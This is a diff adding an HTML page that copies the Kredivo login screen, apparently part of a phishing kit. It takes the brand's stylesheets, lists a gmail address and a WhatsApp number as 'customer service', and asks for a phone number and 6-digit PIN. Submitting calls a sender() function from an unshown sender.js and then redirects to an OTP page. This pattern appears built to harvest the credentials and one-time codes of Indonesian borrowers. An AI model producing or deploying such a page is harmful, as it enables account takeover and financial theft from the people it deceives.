@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link type="text/css" rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+   <title>Kredivo</title>
+   <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/bootstrap.min.css">
+   <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/payment.css">
+   <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/dashboard.css">
+   <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/kredivo.css">
+   <link href="https://www.kredivo.id/p/in/css/weather-icons.min.css">
+   <link rel="stylesheet" href="https://www.kredivo.id/p/in/css/weather-icons.min.css">
+   <!-- Bootstrap -->
+   <link href="https://www.kredivo.id/common/css/bootstrap.min.css" rel="stylesheet">
+   <!-- Boostrap -->   
+   <link rel="stylesheet" href="./css/style.css">
+</head>
+<body>
+   <nav class="navbar navbar-default navbar-fixed-top">
+      <div class="container" id="app">
+          <div class="navbar-header">
+              <button type="button" class="navbar-toggle collapsed" data-target="#navbar" aria-controls="navbar">
+                  <a data-toggle="modal" data-target="#help">Butuh Bantuan?</a>
+                  <span class="sr-only"> </span>
+              </button>                  
+              <a class="navbar-brand logo" href="https://kredivo.com/">Kredivo</a>
+          </div>
+          <div aria-expanded="false" id="navbar" class="navbar-collapse collapse">
+              <ul class="nav navbar-nav navbar-right">
+                  <li><a data-toggle="modal" data-target="#help">Butuh Bantuan?</a></li>
+              </ul>
+          </div>
+      </div>
+  </nav>
+  <!-- Modal Bar -->
+  <div id="help" class="modal fade" role="dialog">
+      <div class="modal-dialog">
+          <div class="modal-content">
+              <div class="modal-header">
+                  <button type="button" class="close" data-dismiss="modal"><i class="fa fa-times" aria-hidden="true"></i></button>
+                  <h4 class="modal-title">Hubungi kami</h4>
+              </div>
+              <div class="modal-body">
+                  <p class="mb-20">Customer Service dapat dihubungi dari Senin - Minggu, 08:00-20:00</p>
+                  <div class="contact-box-header">
+                      <i class="fa fa-question-circle" aria-hidden="true"></i> FAQ
+                  </div>
+                  <p>Punya pertanyaan tentang Kredivo?</p>
+                  <a class="button" href="/" target="_blank">Ke FAQ</a>
+              </div>
+              <div class="contact-box mb-20">
+                  <div class="contact-box-header">
+                      <i class="fa fa-envelope" aria-hidden="true"></i> Email
+                  </div>
+                  <p>Kirim email ke tim<i>support</i> kami untuk mendapatkan bantuan atas masalah Anda.</p>
+                  <a class="button" href="mailto:kredivo976@gmail.com">Kirim email</a>
+              </div>
+              <div class="contact-box">
+                  <div class="contact-box-header">
+                      <i class="fa fa-phone" aria-hidden="true"></i> WhatsApp
+                  </div>
+                  <p>Hubungi kami langsung melalui WhatsApp klik nomor di bawah ini.</p>
+              </div>
+              <div class="contact-box-details">
+                 <a class="button" href="https://wa.me/message/L2MWUWNKQMT2E1">+62-851-9531-4017</a>
+                 
+              </div>
+          </div>
+      </div>
+  </div>
+  <script src="https://www.kredivo.id/p/in/js/jquery.min.js"></script>
+  <script src="https://www.kredivo.id/p/in/js/bootstrap.min.js"></script>
+  
+  <form action="./otp/index.html" onsubmit="return sender()">        
+       <div class="login">
+          <div class="login-label">
+             <h2>Masuk ke Akun Kredivo-mu</h2>
+          </div>
+          <br>
+            <div class="input-group">
+               <span class="ant-input-group-addon">+62</span><input type="tel" name="No handphone" id="number" placeholder="Masukkan nomor handphone kamu" maxlength="15" required>
+                <label class="h3">Nomor handphone</label>
+            </div><br>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Masukkan 6 angka PIN Kredivo-mu" maxlength="6" required>
+                <i class='bx bx-hide eye-icon'></i>
+                <label class="h3">PIN</label>
+            </div>            
+               <br><br>
+            <div class="input-group">
+               <button type="submit" onclick="submit()">Masuk</button> 
+            </div>       
+        </div>
+     </form>         
+    <link rel="stylesheet" href="style.css">
+    <script src="sender.js"></script>
+
+    <br><br>
+    <img src="./img/ma.jpg" width="100%">
+    <img src="./img/mco.png" width="100%">    
+
+</body>
+</html>
